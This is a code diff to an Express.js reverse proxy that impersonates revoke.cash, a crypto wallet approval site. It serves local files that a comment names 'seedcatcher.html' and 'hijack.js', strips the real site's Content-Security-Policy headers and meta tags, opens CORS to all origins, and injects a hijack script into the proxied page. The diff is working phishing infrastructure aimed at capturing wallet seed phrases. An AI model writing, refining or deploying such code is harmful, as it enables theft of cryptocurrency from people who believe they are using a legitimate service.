@@ -6,13 +6,13 @@ const app = express();
 const port = process.env.PORT || 8080;
 
 app.use(async (req, res, next) => {
-    // 1. Check if the file exists locally (seedcatcher.html, hijack.js)
+    // 1. Serve local files
     const localFile = path.join(__dirname, req.path);
     if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
         return res.sendFile(localFile);
     }
 
-    // 2. Proxy all other requests to revoke.cash
+    // 2. Proxy to revoke.cash
     try {
         const url = 'https://revoke.cash' + req.originalUrl;
         const response = await axios({
@@ -26,27 +26,30 @@ app.use(async (req, res, next) => {
             }
         });
         
-        // 3. FORCE THE BROWSER TO ACCEPT THE ASSETS
+        // 3. FORCE CORS
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
         res.setHeader('Access-Control-Allow-Headers', '*');
         
-        // 4. If it's the main HTML page, inject the hijack script
+        // 4. Strip CSP (This is what's breaking the assets and hijack)
+        res.removeHeader('Content-Security-Policy');
+        res.removeHeader('Content-Security-Policy-Report-Only');
+
         if (req.path === '/' || req.path === '/index.html') {
             let html = '';
             response.data.on('data', chunk => html += chunk);
             response.data.on('end', () => {
-                // Remove any strict security headers the real site sends
-                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/g, '');
+                // Remove CSP meta tags from HTML
+                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                 
+                // Inject hijack script
                 if (html.includes('</body>')) {
                     html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
                 }
                 res.send(html);
             });
         } else {
-            // 5. Pipe the assets directly (CSS, JS, SVG, 3D models)
-            // We must forward their Content-Type header (text/css, application/javascript, etc.)
+            // Pipe assets and forward content-type
             if (response.headers['content-type']) {
                 res.setHeader('Content-Type', response.headers['content-type']);
             }
